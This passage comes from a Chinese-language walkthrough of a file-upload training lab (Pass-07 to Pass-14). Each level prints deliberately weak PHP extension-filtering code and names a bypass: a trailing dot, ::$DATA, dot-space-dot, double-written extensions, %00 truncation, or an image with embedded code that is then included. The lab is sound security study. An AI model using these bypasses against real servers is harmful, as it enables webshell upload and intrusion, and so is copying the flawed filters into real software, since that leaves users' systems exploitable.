class="variable">$file_ext</span>); <span class="comment">//首尾去空</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (!in_array(<span class="variable">$file_ext</span>, <span class="variable">$deny_ext</span>)) &#123;</span><br><span class="line">            <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.<span class="variable">$file_name</span>;</span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file(<span class="variable">$temp_file</span>, <span class="variable">$img_path</span>)) &#123;</span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;此文件类型不允许上传！&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = UPLOAD_PATH . <span class="string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>分析源代码，发现没有删除末尾的点，果断点绕过</p><p><img data-src="https://gitee.com/chungod/picture/raw/master/image/image-20210311194252002.png" alt="image-20210311194252002"></p><p>上传上去后，有个小坑，不能访问 a.php.</p><p><img data-src="https://gitee.com/chungod/picture/raw/master/image/image-20210311194821509.png" alt="image-20210311194821509"></p><p>直接访问 a.php</p><p><img data-src="https://gitee.com/chungod/picture/raw/master/image/image-20210311194851252.png" alt="image-20210311194851252"></p><h2 id="pass-08data绕过"><a class="markdownIt-Anchor" href="#pass-08data绕过">#</a> Pass-08 (::$DATA 绕过)</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        <span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&quot;.php&quot;</span>,<span class="string">&quot;.php5&quot;</span>,<span class="string">&quot;.php4&quot;</span>,<span class="string">&quot;.php3&quot;</span>,<span class="string">&quot;.php2&quot;</span>,<span class="string">&quot;.html&quot;</span>,<span class="string">&quot;.htm&quot;</span>,<span class="string">&quot;.phtml&quot;</span>,<span class="string">&quot;.pht&quot;</span>,<span class="string">&quot;.pHp&quot;</span>,<span class="string">&quot;.pHp5&quot;</span>,<span class="string">&quot;.pHp4&quot;</span>,<span class="string">&quot;.pHp3&quot;</span>,<span class="string">&quot;.pHp2&quot;</span>,<span class="string">&quot;.Html&quot;</span>,<span class="string">&quot;.Htm&quot;</span>,<span class="string">&quot;.pHtml&quot;</span>,<span class="string">&quot;.jsp&quot;</span>,<span class="string">&quot;.jspa&quot;</span>,<span class="string">&quot;.jspx&quot;</span>,<span class="string">&quot;.jsw&quot;</span>,<span class="string">&quot;.jsv&quot;</span>,<span class="string">&quot;.jspf&quot;</span>,<span class="string">&quot;.jtml&quot;</span>,<span class="string">&quot;.jSp&quot;</span>,<span class="string">&quot;.jSpx&quot;</span>,<span class="string">&quot;.jSpa&quot;</span>,<span class="string">&quot;.jSw&quot;</span>,<span class="string">&quot;.jSv&quot;</span>,<span class="string">&quot;.jSpf&quot;</span>,<span class="string">&quot;.jHtml&quot;</span>,<span class="string">&quot;.asp&quot;</span>,<span class="string">&quot;.aspx&quot;</span>,<span class="string">&quot;.asa&quot;</span>,<span class="string">&quot;.asax&quot;</span>,<span class="string">&quot;.ascx&quot;</span>,<span class="string">&quot;.ashx&quot;</span>,<span class="string">&quot;.asmx&quot;</span>,<span class="string">&quot;.cer&quot;</span>,<span class="string">&quot;.aSp&quot;</span>,<span class="string">&quot;.aSpx&quot;</span>,<span class="string">&quot;.aSa&quot;</span>,<span class="string">&quot;.aSax&quot;</span>,<span class="string">&quot;.aScx&quot;</span>,<span class="string">&quot;.aShx&quot;</span>,<span class="string">&quot;.aSmx&quot;</span>,<span class="string">&quot;.cEr&quot;</span>,<span class="string">&quot;.sWf&quot;</span>,<span class="string">&quot;.swf&quot;</span>,<span class="string">&quot;.htaccess&quot;</span>);</span><br><span class="line">        <span class="variable">$file_name</span> = trim(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">        <span class="variable">$file_name</span> = deldot(<span class="variable">$file_name</span>);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line">        <span class="variable">$file_ext</span> = strrchr(<span class="variable">$file_name</span>, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        <span class="variable">$file_ext</span> = strtolower(<span class="variable">$file_ext</span>); <span class="comment">//转换为小写</span></span><br><span class="line">        <span class="variable">$file_ext</span> = trim(<span class="variable">$file_ext</span>); <span class="comment">//首尾去空</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (!in_array(<span class="variable">$file_ext</span>, <span class="variable">$deny_ext</span>)) &#123;</span><br><span class="line">            <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.date(<span class="string">&quot;YmdHis&quot;</span>).rand(<span class="number">1000</span>,<span class="number">9999</span>).<span class="variable">$file_ext</span>;</span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file(<span class="variable">$temp_file</span>, <span class="variable">$img_path</span>)) &#123;</span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;此文件类型不允许上传！&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = UPLOAD_PATH . <span class="string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img data-src="https://gitee.com/chungod/picture/raw/master/image/image-20210311195351923.png" alt="image-20210311195351923"></p><p>需要删除::$DATA, 直接访问</p><p><img data-src="https://gitee.com/chungod/picture/raw/master/image/image-20210311195627082.png" alt="image-20210311195627082"></p><h2 id="pass-09点空点绕过"><a class="markdownIt-Anchor" href="#pass-09点空点绕过">#</a> Pass-09（点空点绕过）</h2><p>题目源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        <span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&quot;.php&quot;</span>,<span class="string">&quot;.php5&quot;</span>,<span class="string">&quot;.php4&quot;</span>,<span class="string">&quot;.php3&quot;</span>,<span class="string">&quot;.php2&quot;</span>,<span class="string">&quot;.html&quot;</span>,<span class="string">&quot;.htm&quot;</span>,<span class="string">&quot;.phtml&quot;</span>,<span class="string">&quot;.pht&quot;</span>,<span class="string">&quot;.pHp&quot;</span>,<span class="string">&quot;.pHp5&quot;</span>,<span class="string">&quot;.pHp4&quot;</span>,<span class="string">&quot;.pHp3&quot;</span>,<span class="string">&quot;.pHp2&quot;</span>,<span class="string">&quot;.Html&quot;</span>,<span class="string">&quot;.Htm&quot;</span>,<span class="string">&quot;.pHtml&quot;</span>,<span class="string">&quot;.jsp&quot;</span>,<span class="string">&quot;.jspa&quot;</span>,<span class="string">&quot;.jspx&quot;</span>,<span class="string">&quot;.jsw&quot;</span>,<span class="string">&quot;.jsv&quot;</span>,<span class="string">&quot;.jspf&quot;</span>,<span class="string">&quot;.jtml&quot;</span>,<span class="string">&quot;.jSp&quot;</span>,<span class="string">&quot;.jSpx&quot;</span>,<span class="string">&quot;.jSpa&quot;</span>,<span class="string">&quot;.jSw&quot;</span>,<span class="string">&quot;.jSv&quot;</span>,<span class="string">&quot;.jSpf&quot;</span>,<span class="string">&quot;.jHtml&quot;</span>,<span class="string">&quot;.asp&quot;</span>,<span class="string">&quot;.aspx&quot;</span>,<span class="string">&quot;.asa&quot;</span>,<span class="string">&quot;.asax&quot;</span>,<span class="string">&quot;.ascx&quot;</span>,<span class="string">&quot;.ashx&quot;</span>,<span class="string">&quot;.asmx&quot;</span>,<span class="string">&quot;.cer&quot;</span>,<span class="string">&quot;.aSp&quot;</span>,<span class="string">&quot;.aSpx&quot;</span>,<span class="string">&quot;.aSa&quot;</span>,<span class="string">&quot;.aSax&quot;</span>,<span class="string">&quot;.aScx&quot;</span>,<span class="string">&quot;.aShx&quot;</span>,<span class="string">&quot;.aSmx&quot;</span>,<span class="string">&quot;.cEr&quot;</span>,<span class="string">&quot;.sWf&quot;</span>,<span class="string">&quot;.swf&quot;</span>,<span class="string">&quot;.htaccess&quot;</span>);</span><br><span class="line">        <span class="variable">$file_name</span> = trim(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">        <span class="variable">$file_name</span> = deldot(<span class="variable">$file_name</span>);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line">        <span class="variable">$file_ext</span> = strrchr(<span class="variable">$file_name</span>, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        <span class="variable">$file_ext</span> = strtolower(<span class="variable">$file_ext</span>); <span class="comment">//转换为小写</span></span><br><span class="line">        <span class="variable">$file_ext</span> = str_ireplace(<span class="string">&#x27;::$DATA&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$file_ext</span>);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line">        <span class="variable">$file_ext</span> = trim(<span class="variable">$file_ext</span>); <span class="comment">//首尾去空</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (!in_array(<span class="variable">$file_ext</span>, <span class="variable">$deny_ext</span>)) &#123;</span><br><span class="line">            <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.<span class="variable">$file_name</span>;</span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file(<span class="variable">$temp_file</span>, <span class="variable">$img_path</span>)) &#123;</span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;此文件类型不允许上传！&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = UPLOAD_PATH . <span class="string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>利用点空点绕过</p><p><img data-src="https://gitee.com/chungod/picture/raw/master/image/image-20210311200110217.png" alt="image-20210311200110217"></p><p>成功访问 a.php</p><p><img data-src="https://gitee.com/chungod/picture/raw/master/image/image-20210311200148728.png" alt="image-20210311200148728"></p><h2 id="pass-10双写pphphp绕过"><a class="markdownIt-Anchor" href="#pass-10双写pphphp绕过">#</a> Pass-10 (双写 pphphp 绕过)</h2><p>题目源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        <span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&quot;php&quot;</span>,<span class="string">&quot;php5&quot;</span>,<span class="string">&quot;php4&quot;</span>,<span class="string">&quot;php3&quot;</span>,<span class="string">&quot;php2&quot;</span>,<span class="string">&quot;html&quot;</span>,<span class="string">&quot;htm&quot;</span>,<span class="string">&quot;phtml&quot;</span>,<span class="string">&quot;pht&quot;</span>,<span class="string">&quot;jsp&quot;</span>,<span class="string">&quot;jspa&quot;</span>,<span class="string">&quot;jspx&quot;</span>,<span class="string">&quot;jsw&quot;</span>,<span class="string">&quot;jsv&quot;</span>,<span class="string">&quot;jspf&quot;</span>,<span class="string">&quot;jtml&quot;</span>,<span class="string">&quot;asp&quot;</span>,<span class="string">&quot;aspx&quot;</span>,<span class="string">&quot;asa&quot;</span>,<span class="string">&quot;asax&quot;</span>,<span class="string">&quot;ascx&quot;</span>,<span class="string">&quot;ashx&quot;</span>,<span class="string">&quot;asmx&quot;</span>,<span class="string">&quot;cer&quot;</span>,<span class="string">&quot;swf&quot;</span>,<span class="string">&quot;htaccess&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="variable">$file_name</span> = trim(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">        <span class="variable">$file_name</span> = str_ireplace(<span class="variable">$deny_ext</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$file_name</span>);  这里把文件替换成空</span><br><span class="line">        <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">        <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.<span class="variable">$file_name</span>;        </span><br><span class="line">        <span class="keyword">if</span> (move_uploaded_file(<span class="variable">$temp_file</span>, <span class="variable">$img_path</span>)) &#123;</span><br><span class="line">            <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = UPLOAD_PATH . <span class="string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>利用双写进行绕过 a.pphphp</p><p><img data-src="https://gitee.com/chungod/picture/raw/master/image/image-20210311200535082.png" alt="image-20210311200535082"></p><p><img data-src="https://gitee.com/chungod/picture/raw/master/image/image-20210311200557774.png" alt="image-20210311200557774"></p><h2 id="pass-1100截断"><a class="markdownIt-Anchor" href="#pass-1100截断">#</a> Pass-11 (%00 截断)</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$ext_arr</span> = <span class="keyword">array</span>(<span class="string">&#x27;jpg&#x27;</span>,<span class="string">&#x27;png&#x27;</span>,<span class="string">&#x27;gif&#x27;</span>);</span><br><span class="line">    <span class="variable">$file_ext</span> = substr(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>],strrpos(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>],<span class="string">&quot;.&quot;</span>)+<span class="number">1</span>);  截取后缀名</span><br><span class="line">    <span class="keyword">if</span>(in_array(<span class="variable">$file_ext</span>,<span class="variable">$ext_arr</span>))&#123;</span><br><span class="line">        <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">        <span class="variable">$img_path</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;save_path&#x27;</span>].<span class="string">&quot;/&quot;</span>.rand(<span class="number">10</span>, <span class="number">99</span>).date(<span class="string">&quot;YmdHis&quot;</span>).<span class="string">&quot;.&quot;</span>.<span class="variable">$file_ext</span>;</span><br><span class="line">上面这里是GET</span><br><span class="line">        <span class="keyword">if</span>(move_uploaded_file(<span class="variable">$temp_file</span>,<span class="variable">$img_path</span>))&#123;</span><br><span class="line">            <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&quot;只允许上传.jpg|.png|.gif类型文件！&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在 POST 更改为 a.php%00 截断</p><p><img data-src="https://gitee.com/chungod/picture/raw/master/image/image-20210311204205040.png" alt="image-20210311204205040"></p><p><img data-src="https://gitee.com/chungod/picture/raw/master/image/image-20210311204322772.png" alt="image-20210311204322772"></p><h2 id="pass-1200截断hex"><a class="markdownIt-Anchor" href="#pass-1200截断hex">#</a> Pass-12 (%00 截断 hex)</h2><p>题目源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$ext_arr</span> = <span class="keyword">array</span>(<span class="string">&#x27;jpg&#x27;</span>,<span class="string">&#x27;png&#x27;</span>,<span class="string">&#x27;gif&#x27;</span>);</span><br><span class="line">    <span class="variable">$file_ext</span> = substr(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>],strrpos(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>],<span class="string">&quot;.&quot;</span>)+<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span>(in_array(<span class="variable">$file_ext</span>,<span class="variable">$ext_arr</span>))&#123;</span><br><span class="line">        <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">        <span class="variable">$img_path</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;save_path&#x27;</span>].<span class="string">&quot;/&quot;</span>.rand(<span class="number">10</span>, <span class="number">99</span>).date(<span class="string">&quot;YmdHis&quot;</span>).<span class="string">&quot;.&quot;</span>.<span class="variable">$file_ext</span>;</span><br><span class="line">上面这里是POST</span><br><span class="line">        <span class="keyword">if</span>(move_uploaded_file(<span class="variable">$temp_file</span>,<span class="variable">$img_path</span>))&#123;</span><br><span class="line">            <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&quot;上传失败&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&quot;只允许上传.jpg|.png|.gif类型文件！&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img data-src="https://gitee.com/chungod/picture/raw/master/image/image-20210311204606304.png" alt="image-20210311204606304"></p><p><img data-src="https://gitee.com/chungod/picture/raw/master/image/image-20210311205039010.png" alt="image-20210311205039010"></p><p>成功上传，访问 a.php</p><h2 id="pass-13图片码利用includephp包含"><a class="markdownIt-Anchor" href="#pass-13图片码利用includephp包含">#</a> Pass-13 (图片码，利用 include.php 包含)</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getReailFileType</span>(<span class="params"><span class="variable">$filename</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$file</span> = fopen(<span class="variable">$filename</span>, <span class="string">&quot;rb&quot;</span>);</span><br><span class="line">    <span class="variable">$bin</span> = fread(<span class="variable">$file</span>, <span class="number">2</span>); <span class="comment">//只读2字节</span></span><br><span class="line">    fclose(<span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$strInfo</span> = @unpack(<span class="string">&quot;C2chars&quot;</span>, <span class="variable">$bin</span>);    </span><br><span class="line">    <span class="variable">$typeCode</span> = intval(<span class="variable">$strInfo</span>[<span class="string">&#x27;chars1&#x27;</span>].<span class="variable">$strInfo</span>[<span class="string">&#x27;chars2&#x27;</span>]);    </span><br><span class="line">    <span class="variable">$fileType</span> = <span class="string">&#x27;&#x27;</span>;    </span><br><span class="line">    <span class="keyword">switch</span>(<span class="variable">$typeCode</span>)&#123;      </span><br><span class="line">        <span class="keyword">case</span> <span class="number">255216</span>:            </span><br><span class="line">            <span class="variable">$fileType</span> = <span class="string">&#x27;jpg&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">13780</span>:            </span><br><span class="line">            <span class="variable">$fileType</span> = <span class="string">&#x27;png&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>;        </span><br><span class="line">        <span class="keyword">case</span> <span class="number">7173</span>:            </span><br><span class="line">            <span class="variable">$fileType</span> = <span class="string">&#x27;gif&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:            </span><br><span class="line">            <span class="variable">$fileType</span> = <span class="string">&#x27;unknown&#x27;</span>;</span><br><span class="line">        &#125;    </span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$fileType</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">    <span class="variable">$file_type</span> = getReailFileType(<span class="variable">$temp_file</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$file_type</span> == <span class="string">&#x27;unknown&#x27;</span>)&#123;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&quot;文件未知，上传失败！&quot;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&quot;/&quot;</span>.rand(<span class="number">10</span>, <span class="number">99</span>).date(<span class="string">&quot;YmdHis&quot;</span>).<span class="string">&quot;.&quot;</span>.<span class="variable">$file_type</span>;</span><br><span class="line">        <span class="keyword">if</span>(move_uploaded_file(<span class="variable">$temp_file</span>,<span class="variable">$img_path</span>))&#123;</span><br><span class="line">            <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&quot;上传出错！&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img data-src="https://gitee.com/chungod/picture/raw/master/image/image-20210311213940794.png" alt="image-20210311213814876"></p><p>直接上传 b.jpg，再进行文件包含</p><p><img data-src="https://gitee.com/chungod/picture/raw/master/image/image-20210311214019233.png" alt=""></p><p><img data-src="https://gitee.com/chungod/picture/raw/master/image/image-20210311214113434.png" alt="image-20210311214113434"></p><h2 id="pass-14同13相同图片码"><a class="markdownIt-Anchor" href="#pass-14同13相同图片码">#</a> Pass-14 (同 13 相同图片码)</h2><p>题目源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span 